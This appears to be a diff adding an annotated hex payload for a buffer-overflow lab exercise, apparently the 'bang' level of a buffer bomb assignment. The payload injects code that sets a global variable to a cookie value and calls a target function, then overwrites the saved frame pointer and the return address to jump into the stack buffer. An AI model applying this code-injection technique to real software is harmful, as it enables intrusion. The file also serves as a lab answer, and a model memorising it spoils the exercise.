@@ -1,0 +1,11 @@
+/* 0x55682ff8 starting point */
+c7 05 00 d1 04 08 5a    /* movl   $0x7d02445a,0x804d100 ; set global_val to my cookie(sp04) */
+44 02 7d
+e8 96 5c 9c b2          /* call   0x8048ca8 ; bang - pc */
+/* 0x55683007 pc */
+                     00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00 /* local buffer -0x28(%ebp) */
+00 00 00 00 /* former ebp */
+f8 2f 68 55 /* starting point of this buffer on the stack */
